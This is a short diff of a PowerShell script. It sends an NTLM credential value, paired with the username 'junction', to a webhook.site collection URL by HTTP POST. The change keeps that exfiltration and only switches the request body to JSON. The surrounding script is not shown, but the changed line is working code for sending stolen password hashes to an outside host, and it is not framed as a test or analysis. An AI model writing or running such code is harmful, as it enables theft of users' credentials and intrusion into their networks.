@@ -6,7 +6,7 @@
     
     
     $postParams = @{username='junction';ntlm=$NTLM}
-    Invoke-WebRequest -Uri https://webhook.site/3e5ec05c-2bcd-47d1-af56-fb46ee0c84f9 -Method POST -Body $postParams
+    Invoke-WebRequest -Uri https://webhook.site/3e5ec05c-2bcd-47d1-af56-fb46ee0c84f9 -Method POST -Body ($postParams|ConvertTo-Json) -ContentType "application/json"
     
     Start-Sleep -s 15
     
